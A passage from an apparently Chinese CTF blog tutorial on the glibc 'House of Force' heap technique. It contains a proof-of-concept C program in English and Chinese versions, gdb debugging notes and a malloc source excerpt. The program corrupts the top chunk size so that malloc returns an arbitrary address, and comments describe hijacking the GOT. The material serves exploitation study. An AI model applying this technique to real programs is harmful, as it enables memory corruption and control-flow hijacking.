class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> bss_var[] = <span class="string">&quot;This is a string that we want to overwrite.&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc , <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Force\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The top chunk is a special chunk. Is the last in memory &quot;</span></span><br><span class="line"><span class="string">&quot;and is the chunk that will be resized when malloc asks for more space from the os.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the end, we will use this to overwrite a variable at %p.\n&quot;</span>, bss_var);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Its current value is: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s allocate the first chunk, taking space from the wilderness.\n&quot;</span>);</span><br><span class="line"><span class="type">intptr_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk of 256 bytes has been allocated at %p.\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n&quot;</span>);</span><br><span class="line"><span class="type">int</span> real_size = malloc_usable_size(p1);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\n&quot;</span>, real_size + <span class="keyword">sizeof</span>(<span class="type">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s emulate a vulnerability that can overwrite the header of the Top Chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//----- VULNERABILITY ----</span></span><br><span class="line"><span class="type">intptr_t</span> *ptr_top = (<span class="type">intptr_t</span> *) ((<span class="type">char</span> *)p1 + real_size - <span class="keyword">sizeof</span>(<span class="type">long</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe top chunk starts at %p\n&quot;</span>, ptr_top);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Old size of top chunk %#llx\n&quot;</span>, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)((<span class="type">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="type">long</span>))));</span><br><span class="line">*(<span class="type">intptr_t</span> *)((<span class="type">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="type">long</span>)) = <span class="number">-1</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;New size of top chunk %#llx\n&quot;</span>, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)((<span class="type">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="type">long</span>))));</span><br><span class="line"><span class="comment">//------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n&quot;</span></span><br><span class="line">   <span class="string">&quot;overflow) and will then be able to allocate a chunk right over the desired region.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span></span><br><span class="line"><span class="comment"> * new_top = old_top + nb</span></span><br><span class="line"><span class="comment"> * nb = new_top - old_top</span></span><br><span class="line"><span class="comment"> * req + 2sizeof(long) = new_top - old_top</span></span><br><span class="line"><span class="comment"> * req = new_top - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment"> * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment"> * req = dest - old_top - 4*sizeof(long)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> evil_size = (<span class="type">unsigned</span> <span class="type">long</span>)bss_var - <span class="keyword">sizeof</span>(<span class="type">long</span>)*<span class="number">4</span> - (<span class="type">unsigned</span> <span class="type">long</span>)ptr_top;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;</span></span><br><span class="line">   <span class="string">&quot;we will malloc %#lx bytes.\n&quot;</span>, bss_var, ptr_top, evil_size);</span><br><span class="line"><span class="type">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;</span>, new_ptr - <span class="keyword">sizeof</span>(<span class="type">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* ctr_chunk = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(100) =&gt; %p!\n&quot;</span>, ctr_chunk);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can finally overwrite that value:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... old string: %s\n&quot;</span>, bss_var);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... doing strcpy overwrite with \&quot;YEAH!!!\&quot;...\n&quot;</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(ctr_chunk, <span class="string">&quot;YEAH!!!&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... new string: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line">assert(ctr_chunk == bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// some further discussion:</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;</span></span><br><span class="line"><span class="comment">//&quot;and we \nwant to set this result to the address of malloc_got_address-8\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;</span></span><br><span class="line"><span class="comment">//&quot;\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\n&quot;,p2);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\n&quot;,malloc_got_address);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\n&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><ul><li>同样地，为了更好的代码审计，我将该代码进行中文翻译</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   这个Poc在开启ASLR保护的时候也能使用.</span></span><br><span class="line"><span class="comment">   它将劫持got表,因此为了能准确应用这个技术RELRO保护必须关闭.</span></span><br><span class="line"><span class="comment">   如果开启RELRO保护,我们总能尝试返回一个chunk到栈上这个方法被 Malloc Des Maleficarum提出</span></span><br><span class="line"><span class="comment">   ( http://phrack.org/issues/66/10.html )</span></span><br><span class="line"><span class="comment">   测试在ubuntu14.04,64位,ubuntu 18.04</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> bss_var[] = <span class="string">&quot;This is a string that we want to overwrite.&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc , <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n欢迎来到 house of Force\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;House of Force 的利用方法是修改Top chunk并且让malloc返回一个任意值.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Top chunk 是一个特别的chunk,它在内存中的最后一个堆块 &quot;</span></span><br><span class="line"><span class="string">&quot;并且当malloc向操作系统申请更多的空间后这个chunk的起始地址将升高.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n最后,我们将使用Top chunk的这种运行机制去修改的值为: %p 的变量.\n&quot;</span>, bss_var);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;它当前的值为: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n让我们占用一部分Top chunk的空间,分配给第一个申请的chunk.\n&quot;</span>);</span><br><span class="line"><span class="type">intptr_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;这个256字节的chunk已经被分配在地址为: %p 处.\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n现在堆由两个部分组成: 我们申请的堆块和Top chunk.\n&quot;</span>);</span><br><span class="line"><span class="type">int</span> real_size = malloc_usable_size(p1);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;我们已经分配的chunk对齐后的真实size为: %ld.\n&quot;</span>, real_size + <span class="keyword">sizeof</span>(<span class="type">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n现在让我们模拟一个能修改Top Chunk头部的漏洞\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//----- VULNERABILITY ----</span></span><br><span class="line"><span class="type">intptr_t</span> *ptr_top = (<span class="type">intptr_t</span> *) ((<span class="type">char</span> *)p1 + real_size - <span class="keyword">sizeof</span>(<span class="type">long</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nTop chunk起始地址为: %p\n&quot;</span>, ptr_top);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n使用一个很大的值修改Top Chunk的size位,以便我们能确保malloc不会调用mmap.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;之前的Top chunk的size值为 %#llx\n&quot;</span>, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)((<span class="type">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="type">long</span>))));</span><br><span class="line">*(<span class="type">intptr_t</span> *)((<span class="type">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="type">long</span>)) = <span class="number">-1</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;新的Top chunk的size值为 %#llx\n&quot;</span>, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)((<span class="type">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="type">long</span>))));</span><br><span class="line"><span class="comment">//------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n新的Top chunk的size非常大,我们在调用使用malloc时,就不会通过mmap系统调用分配堆块.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;接下来,我们将分配一个chunk,使我们能够接近目标区域(通过整数溢出)\n&quot;</span></span><br><span class="line">   <span class="string">&quot;然后我们将能够分配一个chunk,这个chunk正好覆盖在目标区域上方.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 申请的堆块大小的计算方式为(size = malloc申请的大小 + 存储元数据的空间):</span></span><br><span class="line"><span class="comment"> * new_top = old_top + nb</span></span><br><span class="line"><span class="comment"> * nb = new_top - old_top</span></span><br><span class="line"><span class="comment"> * req + 2sizeof(long) = new_top - old_top</span></span><br><span class="line"><span class="comment"> * req = new_top - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment"> * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment"> * req = dest - old_top - 4*sizeof(long)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> evil_size = (<span class="type">unsigned</span> <span class="type">long</span>)bss_var - <span class="keyword">sizeof</span>(<span class="type">long</span>)*<span class="number">4</span> - (<span class="type">unsigned</span> <span class="type">long</span>)ptr_top;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n我们想修改的目的地址为: %p, 而top chunk的地址为: %p, 所以计算头部的size,\n&quot;</span></span><br><span class="line">   <span class="string">&quot;我们将申请的堆块大小为: %#lx bytes.\n&quot;</span>, bss_var, ptr_top, evil_size);</span><br><span class="line"><span class="type">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;正如所料, 这个新的指针指向的是之前top chunk的地址: %p\n&quot;</span>, new_ptr - <span class="keyword">sizeof</span>(<span class="type">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* ctr_chunk = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n现在,之后我们要修改的接下去的一个chunk将指向目标缓冲区.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(100) =&gt; %p!\n&quot;</span>, ctr_chunk);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;最后,我们修改这个值Now, we can finally overwrite that value:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... 之前的字符串为: %s\n&quot;</span>, bss_var);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... 我们把\&quot;YEAH!!!\&quot;赋值进去 ...\n&quot;</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(ctr_chunk, <span class="string">&quot;YEAH!!!&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... 新的字符串为: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line">assert(ctr_chunk == bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 一些进一步总结:</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;修改完Top chunk后,我们调用malloc所传递的参数的值需要按照如下计算evil_size = malloc_got_address - 8 - p2_guessed\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;因为 main_arena-&gt;top 指针被设置到 av-&gt;top + malloc_size &quot;</span></span><br><span class="line"><span class="comment">//&quot;并且我们想要设置结果地址为 malloc_got_address-8\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;为了达到 malloc_got_address-8 = p2_guessed + evil_size\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;av-&gt;top将在我们申请很大堆块的堆块之后被设置为malloc_got_address-8\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;之后再次调用malloc将返回av-&gt;top+8这个地址( 头部元数据占8 字节 ),&quot;</span></span><br><span class="line"><span class="comment">//&quot;\n并且基本上返回一个chunk的地址为(malloc_got_address-8)+8 = malloc_got_address\n\n&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;这个evil_size的chunk已经被分配在地址为: 0x%08x 的地方\n&quot;,p2);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;main_arena 的值(即av-&gt;top) 已经被设置为malloc_got_address-8=0x%08x\n&quot;,malloc_got_address);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;最后再使用malloc将从剩下的空间中申请并且malloc将返回之前注入的av-&gt;top+8\n&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>接下来我们进行动态调试，首先字符串<code>This is a string that we want to overwrite.</code>，是在<code>0x602080</code>地址处</li><li>由于调试的时候会出现异常情况从而导致退出<code>gdb</code>调试，并且也没有关闭堆地址随机偏移，这就导致了图片中有些地址会改变</li><li>我们先执行一次<code>malloc(0x100)</code>，此时实际申请的堆块大小为<code>0x110</code>，此时<code>top_chunk</code>的<code>size位</code>是这样的，这时我们程序就有两个堆块。一个是malloc申请回来可以使用的堆块，是不能使用的待申请的堆块<code>top_chunk</code></li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250211230308853.png" alt="image-20250211230308853"></p><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250211231056792.png" alt="image-20250211231056792"></p><ul><li>接下来我们就修改<code>Top_chunk</code>的<code>size</code>位，修改size位为<code>-1</code>，这样<code>Top_chunk</code>的<code>size</code>位就会变得非常大，当我们申请一个非常大块的内存时，就不会调用<code>mmap</code>，这个操作。</li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250211231325122.png" alt="image-20250211231325122"></p><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250211231502341.png" alt="image-20250211231502341"></p><ul><li>之后我们就计算<code>malloc</code>要申请的堆块大小。由<code>目的地址 - top_chunk起始地址(即prev_size的地址)-sizeof(long)*4(即0x20字节)</code>，由于<code>.bss</code>段的地址比<code>堆</code>地址小，这时申请的目的地址就会是负数<code>-13725872</code>（十六进制为<code>0xFFFFFFFFFF2E8F50</code>）</li><li>所以我们要申请的大小就是<code>malloc(-13725872)</code>，在申请完之后<code>Top_chunk</code>的地址就会变成<code>0x602070</code>其<code>prev_size和size</code>这两个位都在<code>This is a string that we want to overwrite.</code>这个字符串的上方</li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250211233126674.png" alt="image-20250211233126674"></p><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250211233206525.png" alt="image-20250211233206525"></p><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250211233911215.png" alt="image-20250211233911215"></p><ul><li>这个来具体介绍一下为什么<code>Top_chunk</code>的地址会变成<code>0x602070</code>，这里的需要用到整数溢出和堆块的隐式链表技术。这时我们就要查看一下上面<code>top_chunk</code>源码这边，关键点在<code>chunk_at_offset (victim, nb)</code>这边<ul><li><code>nb</code>这个变量是用户申请的堆块大小，经过对齐等操作后要申请的实际大小。</li><li><code>victim</code>这个变量在对<code>top_chunk</code>操作时就是指向<code>top_chunk</code>的起始地址</li><li>我们注意到这个语句<code>remainder = chunk_at_offset (victim, nb);</code>，它执行的是<code>victim+nb</code>（这就是一个切割<code>top_chunk</code>的操作），所以当我们堆块申请的是负数的时候<code>victim + nb</code>就会降低<code>top_chunk</code>的地址。(利用隐式链表技术更新top_chunk的指针)</li><li>这时就会使得<code>top_chunk</code>的起始地址在<code>bss</code>段中。</li><li>这时我们<code>top_chunk</code>的<code>size</code>位就会发生整数溢出<code>-1-(-13725888)</code></li><li>这边还要注意一下：<strong>我们需要通过申请负值来修改top_chunk的地址为低地址，而负值在malloc中有一处比较会导致非常大，所以必须要溢出修改top_chunk的size位为<code>-1</code>从而绕过判断检查(这是在之后打level1调试出来体会到的)</strong></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">/*这边也给出chunk_at_offset (victim, nb)这个宏定义*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></span><br></pre></td></tr></table></figure><ul><li>这时我们再申请一个堆块，该堆块的<code>prev_size</code>和<code>size</code>就是<code>top_chunk</code>申请之前的<code>prev_size</code>和<code>size</code>，而用户使用的内存空间的起始地址就为字符串<code>This is a string that we want to overwrite.</code>的起始地址，这样我们就可以对该地址中的内容进行修改。</li><li>就像图中这样我们使用<code>malloc</code>申请了<code>100</code>字节大小的堆块，这样我们就可以修改字符串了</li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212000130436.png" alt="image-20250212000130436"></p><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212000355249.png" alt="image-20250212000355249"></p><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212000637163.png" alt="image-20250212000637163"></p><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><ul><li><code>house of 